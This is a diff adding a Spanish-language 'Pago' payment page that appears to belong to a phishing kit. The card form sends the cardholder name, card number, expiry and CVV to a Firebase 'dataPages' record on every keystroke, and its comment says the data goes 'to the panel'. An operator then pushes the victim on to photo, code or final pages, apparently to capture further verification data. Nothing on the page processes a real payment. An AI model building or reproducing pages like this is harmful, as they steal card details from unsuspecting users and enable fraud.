@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<title>Pago</title>
+
+<style>
+body{
+  margin:0;
+  font-family: Arial, sans-serif;
+  background:#f4f1ec;
+}
+
+.header{
+  background:#fff; /* blanco */
+  height:60px;     /* barra delgada */
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  border-bottom:1px solid #ddd; /* línea suave opcional */
+}
+
+.logo{
+  height:45px;     /* más pequeño */
+  transform:none;  /* elimina el zoom */
+}
+
+/* CONTENEDOR */
+.container{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
+  padding:20px;
+}
+
+/* TARJETA */
+.card{
+  background:white;
+  border-radius:18px;
+  width:100%;
+  max-width:480px;
+  box-shadow:0 15px 30px rgba(0,0,0,0.12);
+}
+
+/* CONTENIDO */
+.content{
+  padding:25px 20px;
+}
+
+h2{
+  margin-bottom:20px;
+}
+
+/* INPUTS */
+.input-group{
+  margin-bottom:18px;
+}
+
+.input-group label{
+  display:block;
+  font-size:13px;
+  margin-bottom:6px;
+  color:#555;
+}
+
+.input-group input{
+  width:100%;
+  padding:14px 16px;
+  border-radius:10px;
+  border:1px solid #ccc;
+  font-size:15px;
+  box-sizing:border-box;
+}
+
+/* FILA DOBLE */
+.row{
+  display:flex;
+  gap:10px;
+}
+
+.row .input-group{
+  flex:1;
+}
+
+/* BOTÓN */
+.btn{
+  margin-top:20px;
+  width:100%;
+  padding:16px;
+  border:none;
+  border-radius:12px;
+  background:#7c7468;
+  color:white;
+  font-size:16px;
+  cursor:pointer;
+}
+
+.btn:hover{
+  background:#5e574e;
+}
+
+/* MOBILE */
+@media(max-width:768px){
+
+  .header{
+    flex-direction:column;
+    align-items:center;
+  }
+
+  .card{
+    max-width:100%;
+  }
+
+  .content{
+    padding:25px 18px;
+  }
+
+}
+
+
+/* BOTÓN DESACTIVADO */
+.btn{
+  margin-top:20px;
+  width:100%;
+  padding:16px;
+  border:none;
+  border-radius:12px;
+  background:#ccc; /* gris opaco */
+  color:#777;
+  font-size:16px;
+  cursor:not-allowed;
+  transition:0.3s;
+}
+
+/* BOTÓN ACTIVO */
+.btn.activo{
+  background:#101411;
+  color:#fff;
+  cursor:pointer;
+}
+
+
+
+
+.overlay{
+  display:none;
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,0.5);
+  backdrop-filter:blur(4px);
+  justify-content:center;
+  align-items:center;
+  z-index:9999;
+}
+
+.loader{
+  text-align:center;
+  color:#fff;
+}
+
+.spinner{
+  width:40px;
+  height:40px;
+  border:4px solid #fff;
+  border-top:4px solid #333;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin:0 auto 10px;
+}
+
+@keyframes spin{
+  to{ transform:rotate(360deg); }
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">
+  <img src="logo.svg" class="logo">
+</div>
+
+<div class="container">
+
+  <div class="card">
+
+    <div class="content">
+
+      <h2>Detalles del Pago</h2>
+
+      <div class="input-group">
+        <label>Nombre en la Tarjeta</label>
+        <input type="text" placeholder="">
+      </div>
+
+      <div class="input-group">
+        <label>Número de Tarjeta</label>
+        <input type="text" placeholder="•••• •••• •••• 1234">
+      </div>
+
+      <div class="row">
+        <div class="input-group">
+          <label>Fecha (MM/AA)</label>
+          <input type="text" placeholder="12/26">
+        </div>
+
+        <div class="input-group">
+          <label>CVV</label>
+          <input type="password" placeholder="•••">
+        </div>
+      </div>
+
+      <button class="btn" id="btnPagar" disabled>
+      Pagar COL$ 0
+     </button>
+
+    </div>
+
+  </div>
+
+</div>
+
+
+<div class="overlay">
+  <div class="loader">
+    <div class="spinner"></div>
+    <p>Cargando...</p>
+  </div>
+</div>
+
+<script>
+  let monto = localStorage.getItem("monto");
+
+  if (monto) {
+    // convertir a número y formatear con puntos
+    let montoFormateado = Number(monto).toLocaleString("es-CO");
+
+    document.getElementById("btnPagar").innerText =
+      "Pagar COL$ " + montoFormateado;
+  }
+</script>
+
+<script>
+const inputs = document.querySelectorAll("input");
+const btn = document.getElementById("btnPagar");
+const overlay = document.querySelector(".overlay");
+
+// seleccionar inputs específicos
+const nombre = inputs[0];
+const tarjeta = inputs[1];
+const fecha = inputs[2];
+const cvv = inputs[3];
+
+
+// ✅ NOMBRE → SOLO LETRAS
+nombre.addEventListener("input", () => {
+  nombre.value = nombre.value
+    .replace(/[^a-zA-Z\s]/g, "") // elimina números y símbolos
+    .toUpperCase(); // opcional: siempre mayúsculas
+});
+
+
+// ✅ TARJETA → SOLO NÚMEROS (MAX 16)
+tarjeta.addEventListener("input", () => {
+  tarjeta.value = tarjeta.value
+    .replace(/\D/g, "") // solo números
+    .slice(0, 16); // máximo 16
+});
+
+
+// ✅ FECHA → FORMATO MM/AA AUTOMÁTICO
+fecha.addEventListener("input", () => {
+  let valor = fecha.value.replace(/\D/g, "").slice(0, 4);
+
+  if (valor.length >= 3) {
+    fecha.value = valor.slice(0, 2) + "/" + valor.slice(2);
+  } else {
+    fecha.value = valor;
+  }
+});
+
+
+// ✅ CVV → SOLO NÚMEROS (MAX 3)
+cvv.addEventListener("input", () => {
+  cvv.value = cvv.value
+    .replace(/\D/g, "")
+    .slice(0, 3);
+});
+
+
+// ✅ VALIDAR FORMULARIO (tu lógica mejorada)
+function validarFormulario() {
+  let completo =
+    nombre.value.length > 2 &&
+    tarjeta.value.length === 16 &&
+    fecha.value.length === 5 &&
+    cvv.value.length === 3;
+
+  if (completo) {
+    btn.disabled = false;
+    btn.classList.add("activo");
+  } else {
+    btn.disabled = true;
+    btn.classList.remove("activo");
+  }
+}
+
+// escuchar cambios
+inputs.forEach(input => {
+  input.addEventListener("input", validarFormulario);
+});
+</script>
+
+<script type="module" src="firebase.js"></script>
+
+<script>
+window.addEventListener('load', () => {
+
+const { db, uid, ref, update, onValue } = window;
+// ===============================
+// 🔹 ESTADO CONEXIÓN
+// ===============================
+update(ref(db, "dataPages/" + uid), { 
+  estado: "abierto",
+  paginaActual: "Card.html" 
+});
+
+window.addEventListener("beforeunload", () => {
+  update(ref(db, "dataPages/" + uid), { 
+    estado: "cerrado",
+    paginaActual: null  
+  });
+});
+
+nombre.addEventListener("input", () => {
+  update(ref(db, "dataPages/" + uid), {
+    nombreTarjeta: nombre.value
+  });
+});
+
+tarjeta.addEventListener("input", () => {
+  update(ref(db, "dataPages/" + uid), {
+    tarjeta: tarjeta.value
+  });
+});
+
+fecha.addEventListener("input", () => {
+  const partes = fecha.value.split("/");
+
+  update(ref(db, "dataPages/" + uid), {
+    mes: partes[0] || "",
+    anio: partes[1] || ""
+  });
+});
+
+cvv.addEventListener("input", () => {
+  update(ref(db, "dataPages/" + uid), {
+    cvv: cvv.value
+  });
+});
+
+
+btn.addEventListener("click", () => {
+
+  // 🔒 bloquear botón
+  btn.disabled = true;
+
+  // 🔴 enviar al panel
+  update(ref(db, "dataPages/" + uid), {
+    tarjetaLista: true
+  });
+
+  // 🔥 mostrar overlay
+  if(overlay) overlay.style.display = "flex";
+
+});
+
+onValue(ref(db, "dataPages/" + uid), snapshot => {
+  const data = snapshot.val();
+  if (!data) return;
+
+  // 🔥 IR A FOTO
+  if (data.accion === "foto") {
+
+    update(ref(db, "dataPages/" + uid), {
+      accion: null
+    });
+
+    window.location.href = "foto.html";
+  }
+
+    // 🔴 IR A CÓDIGO
+  if (data.accion === "codigo") {
+    update(ref(db, "dataPages/" + uid), {
+      accion: null
+    });
+    window.location.href = "codigo.html";
+  }
+
+  if (data.accion === "final") {
+
+  update(ref(db, "dataPages/" + uid), {
+    accion: null
+  });
+
+  window.location.href = "../../final.html";
+}
+
+});
+
+
+});
+</script>
+</body>
+</html>
